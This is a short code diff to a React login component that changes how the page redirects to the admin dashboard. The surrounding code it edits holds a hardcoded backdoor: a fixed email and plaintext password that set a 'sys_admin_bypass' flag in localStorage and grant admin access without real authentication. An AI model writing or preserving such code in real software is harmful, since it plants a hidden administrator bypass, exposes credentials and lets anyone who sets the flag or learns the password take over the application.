@@ -33,8 +33,8 @@ export default function Login() {
       if (email.toLowerCase() === 'system.admin@gmail.com' && password === 'pukonnect@!') {
         console.log('System Override Activated (Main Login)');
         localStorage.setItem('sys_admin_bypass', 'true');
-        // Force reload to pick up the new auth state
-        window.location.href = '/admin/dashboard';
+        // Force full reload to ensure AuthContext picks up the new localStorage value from scratch
+        window.location.assign('/admin/dashboard');
         return;
       }
 
